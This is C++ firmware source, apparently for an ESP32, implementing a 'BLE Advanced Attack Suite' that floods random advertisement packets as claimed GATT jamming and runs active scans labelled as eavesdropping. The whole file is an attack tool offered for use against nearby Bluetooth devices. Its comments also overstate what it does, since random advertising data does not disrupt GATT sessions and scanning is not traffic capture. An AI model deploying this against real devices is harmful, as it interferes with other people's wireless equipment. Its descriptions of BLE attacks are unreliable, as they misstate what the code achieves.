#include "ble_advanced_attack_suite.h"
#include "tx_arm.h"
#include <BLEDevice.h>
#include "tool_output_helper.h"
#include "result_renderers.h"
#include "audit_log.h"

namespace {
volatile bool g_attackActive = false;
uint32_t g_attackCount = 0;
}

namespace BLEAdvancedAttackSuite {

AttackResult attackBLE(uint32_t durationMs, const String &method) {
    AttackResult result{false, 0, durationMs, method};

    Serial.println("\n=== BLE Advanced Attack Suite ===");
    Serial.println("Method: " + method);
    Serial.println("Duration: " + String(durationMs) + "ms");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed");
        return result;
    }

    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();

    g_attackActive = true;
    g_attackCount = 0;
    uint32_t startTime = millis();
    uint32_t deadline = startTime + durationMs;

    while ((int32_t)(millis() - deadline) < 0 && g_attackActive) {
        if (method == "GATT" || method == "ALL") {
            // GATT service disruption - send GATT jam packets
            uint8_t gattJam[20];
            for (int i = 0; i < 20; i++) {
                gattJam[i] = (esp_random() % 256);
            }

            BLEAdvertisementData advData;
            advData.setFlags(0x06);
            advData.addData(std::string((const char*)gattJam, 20));

            if (pAdvertising) {
                pAdvertising->setAdvertisementData(advData);
                pAdvertising->start();
                delayMicroseconds(100);
                pAdvertising->stop();
            }
            g_attackCount++;
        }

        if (method == "EAVES" || method == "ALL") {
            // Eavesdrop on BLE traffic - active scan to detect devices
            pBLEScan->start(1, false);  // Scan for 1 second
            g_attackCount++;
        }

        delayMicroseconds(500);

        if (g_attackCount % 50 == 0) {
            Serial.println("  [" + String(g_attackCount) + "] attack packets");
        }
    }

    g_attackActive = false;
    result.success = true;
    result.attackPacketsCount = g_attackCount;

    Serial.println("✓ Complete: " + String(g_attackCount) + " packets");
    BLEDevice::deinit(false);
    return result;
}

void stop() {
    g_attackActive = false;
}

bool isActive() {
    return g_attackActive;
}

}  // namespace BLEAdvancedAttackSuite
